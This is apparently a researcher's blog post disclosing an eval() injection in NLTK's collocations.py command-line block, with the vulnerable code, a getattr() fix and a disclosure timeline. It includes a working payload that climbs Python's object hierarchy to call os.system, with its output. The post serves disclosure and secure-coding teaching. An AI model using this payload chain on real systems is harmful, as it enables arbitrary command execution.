---
layout: post
title: "NLTK Command Injection via eval() in collocations.py"
author: Yunus Aydın
date: 2026-06-07
lang: en
description: "Command injection vulnerability in NLTK collocations.py via eval() on sys.argv. Arbitrary Python code execution analysis — what NLP developers need to know."
keywords: "NLTK command injection, eval injection, collocations.py vulnerability, sys.argv exploit, Python security, NLP security, code injection, security research"
canonical_url: "https://aydinnyunus.github.io/2026/06/07/command-injection-nltk-collocations-eval/"
---

I reported this to huntr on November 14th, 2025. No CVE has been assigned. The vulnerability is real (you can get arbitrary code execution), but exploitation requires running the script locally, which puts it in a gray area for most bug bounty scopes. I'm writing it up anyway because the underlying pattern is worth understanding.

## The code

`nltk/collocations.py` has a `__main__` block that runs when the module is invoked directly. It uses `eval()` to select a scoring function by name from the command line:

```python
if __name__ == "__main__":
    import sys
    from nltk.metrics import BigramAssocMeasures
    
    try:
        scorer = eval("BigramAssocMeasures." + sys.argv[1])
    except IndexError:
        scorer = None
    try:
        compare_scorer = eval("BigramAssocMeasures." + sys.argv[2])
    except IndexError:
        compare_scorer = None
```

The intent is something like `python -m nltk.collocations likelihood_ratio`. The user passes a method name, the code prepends `BigramAssocMeasures.`, and `eval()` resolves it to the actual function.

The problem is that `sys.argv[1]` is fully controlled by whoever runs the command.

## Exploitation

Python's MRO and `__subclasses__()` let you climb the object hierarchy from any string context and reach arbitrary modules. The payload uses that to get to `os.system`:

```bash
python3 -m nltk.collocations '__mro__[-1].__subclasses__()[166].__init__.__globals__["sys"].modules["os"].system("id")' 'None'
```

Output:

```text
<frozen runpy>:128: RuntimeWarning: 'nltk.collocations' found in sys.modules after import of package 'nltk',
but prior to execution of 'nltk.collocations'; this may result in unpredictable behaviour
uid=502(yunus.aydin) gid=20(staff) groups=20(staff),502(awagent_enrolled),501(awagent),12(everyone),
61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),...
Traceback (most recent call last):
  ...
  File ".../nltk/collocations.py", line 402, in <module>
    compare_scorer = eval("BigramAssocMeasures." + sys.argv[2])
  File "<string>", line 1
    BigramAssocMeasures.None
SyntaxError: invalid syntax
```

The `id` command ran and printed the user's uid, gid, and groups before the second `eval()` call failed on `"None"`. The traceback is a red herring; the damage was already done on line 398.

## The scope debate

Huntr flagged this as possibly out of scope because it's command injection in a local CLI without networking components. That's a fair reading. To exploit this, you need to already have code execution on the target machine; at which point `eval()` in a Python script isn't your most interesting attack vector.

The counterargument I'd make is narrower: the risk scales with how the library is used. NLTK is a widely deployed NLP library. If `collocations.py` is ever invoked with externally derived arguments (a wrapper script that passes user input to `python -m nltk.collocations`, a Jupyter environment with dynamic cell execution, a build pipeline that interpolates config values), the `eval()` path becomes a problem. The code makes an assumption about execution context that isn't guaranteed.

More simply: `eval()` on user-controlled strings is never the right tool for selecting a method by name. Python has `getattr()` for that.

## The fix

Replace `eval()` with `getattr()`:

```python
if __name__ == "__main__":
    import sys
    from nltk.metrics import BigramAssocMeasures
    
    try:
        scorer = getattr(BigramAssocMeasures, sys.argv[1])
    except (IndexError, AttributeError):
        scorer = None
    try:
        compare_scorer = getattr(BigramAssocMeasures, sys.argv[2])
    except (IndexError, AttributeError):
        compare_scorer = None
```

`getattr(BigramAssocMeasures, "likelihood_ratio")` does exactly what the original `eval("BigramAssocMeasures.likelihood_ratio")` was trying to do (resolves the named attribute) without allowing arbitrary code execution. An invalid attribute name raises `AttributeError` instead of executing it.

## Why `eval()` keeps showing up here

The `__main__` block pattern in Python libraries is usually written quickly and rarely reviewed as carefully as the library's public API. It's "just a demo" or "just for testing", which means it gets less scrutiny and more shortcuts. `eval()` for dynamic dispatch feels clever in the moment. `getattr()` takes one more second to remember.

The broader lesson: `eval()` on any user-controlled input (argv, environment variables, config files, HTTP parameters) is a code smell regardless of context. The execution environment you write for isn't the only one the code will run in.

## Disclosure timeline

- **November 14, 2025**: Reported to huntr.dev
- **November 14, 2025**: Huntr flagged as possibly out of scope (local CLI, no networking component)
- No CVE assigned as of publication

## References

- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
- **NLTK**: [https://www.nltk.org/](https://www.nltk.org/)
- **Python Security**: [https://peps.python.org/pep-0665/](https://peps.python.org/pep-0665/)

## Related content

- [CVE-2026-0558: Unauthenticated file upload in LollMS](https://aydinnyunus.github.io/2026/03/28/unauthenticated-file-upload-lollms-cve-2026-0558/)
- [SQL Injection Vulnerability: Security Issue in GeoPandas to_postgis() Function](/2025/12/27/sql-injection-geopandas/)
- [SSRF in LollMS Export: CVE-2026-0560](https://aydinnyunus.github.io/2026/03/28/ssrf-lollms-export-content-cve-2026-0560/)
